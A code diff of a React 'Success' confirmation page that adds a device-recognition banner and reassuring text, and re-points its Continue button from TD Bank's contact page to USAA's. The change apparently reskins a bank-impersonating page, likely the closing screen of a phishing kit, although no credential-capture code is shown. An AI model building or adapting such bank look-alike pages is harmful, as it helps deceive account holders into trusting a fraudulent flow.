@@ -3,14 +3,21 @@ import { Box, Text, Image, Heading, Link, Center, Button } from '@chakra-ui/reac
 function Success() {
   return (
     <Box>
-      <Box fontFamily={'Poppins'} minH="72.3vh">
-      
+      <Box minH="72.3vh">
+      <Center p={4} bgColor="whitesmoke" justifyContent="space-between">
+          <Text pl={2} fontSize="md" color="#196999" fontWeight="semibold">
+          We recognize this device.
+          </Text>
+          <Text textDecor={'underline'} pl={2} fontSize="md" color="#196999" fontWeight="semibold"><a href='#'>
+           View</a>
+          </Text>
+        </Center>
 
        
 
         <Box >
             <Center>
-            <Image mt={10} w={320} src={'./images/tikk.png'} />
+            <Image mt={10} w={120} src={'./images/tick.svg'} />
             </Center>
             <Box>
                 <Center>
@@ -19,7 +26,7 @@ function Success() {
           </Heading>
           </Center>
         </Box>
-            <Text textAlign={'center'}  fontWeight={'normal'} mt={4} p={4} fontSize="15px" color="blackAlpha.800">
+            <Text textAlign={'center'}  fontWeight={'semibold'} mt={4} p={4} fontSize="15px" color="blackAlpha.800">
                           No further action is required. A representative will contact you within 24 to 72 hours.
                         </Text>
                         
@@ -30,8 +37,8 @@ function Success() {
     
           
           <Box p={4}>
-         <Link href='https://www.td.com/us/en/personal-banking/contact-us'>
-          <Button _hover={{ bg: '#526f30', color: 'whitesmoke', borderRadius: 2 }} mt={2} h={12}  bgColor="#47A040" color="whitesmoke" borderRadius={2} w="100%">
+         <Link href='https://www.usaa.com/help/contact/?wa_ref=pub_footer_contact&akredirect=true'>
+          <Button _hover={{ bg: '#526f30', color: 'whitesmoke', borderRadius: 2 }} mt={2} h={12} bgColor="#486428" color="whitesmoke" borderRadius={2} w="100%">
             Continue
           </Button>
           </Link>
